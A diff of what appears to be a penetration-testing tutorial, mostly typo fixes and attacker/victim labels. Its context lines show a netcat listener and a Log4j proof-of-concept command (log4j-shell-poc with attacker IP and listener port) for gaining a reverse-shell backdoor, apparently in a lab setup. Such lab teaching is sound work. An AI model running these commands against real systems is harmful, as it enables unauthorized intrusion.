@@ -31,7 +31,7 @@ nc -vv <target-domain> 80
 > "80" = is the port we want to connect
 
 then type 
-```h
+```
 GET / HTTP/1.0
 ```
 → press `ENTER` twice
@@ -150,9 +150,9 @@ ftp <target-ip/domain>
 
 ### Exploit log4j vulnerability
 
-here we will be gaining a bakdoor into the system by exploiting the Log4j vulnerability
+here we will be gaining a backdoor into the system by exploiting the Log4j vulnerability
 
-first we install a vulnerable log4j server inside a linux-based machine
+first we install a vulnerable log4j server inside a linux-based machine(Victim Ubuntu)
 ```bash
 apt install docker.io
 ```
@@ -219,7 +219,7 @@ cd log4j-shell-poc
  nc -nlvp 9001
  ```
 
-now in the previous terminal
+now in the Attacker another terminal
  ```bash
  python3 poc.py -userip 10.10.1.13 --webport 8000 --lport 9001
  ```
